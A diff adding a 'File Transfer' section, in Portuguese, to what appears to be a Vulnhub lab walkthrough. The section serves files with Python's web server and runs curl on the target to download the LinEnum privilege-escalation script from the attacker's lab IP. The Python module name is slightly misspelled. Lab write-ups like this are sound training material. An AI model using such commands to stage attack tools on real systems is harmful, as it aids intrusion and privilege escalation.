@@ -189,6 +189,19 @@ Particulamente eu sempre uso o `LinEnum`, para realizar privesc. Existem outros 
 
 #### File Transfer
 
+Em um pentest é comumente necessário a transferência de arquivos, hoje vou usar o modulo webserver do python, existe varias outras formas para transferência de arquivo, talvez pode rolar ate um post explanando sobre.
+
+```
+python -m SimpleHTTPserver 80
+```
+
+Usando o `curl` em nossa máquina alvo, fazemos o download do Linenum.
+
+```
+curl http://192.168.111.128/LinEnum.sh -O LinEnum.sh
+```
+
+![trasnfer](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/trasnfer.png)
 
 
 [back](../index.md)
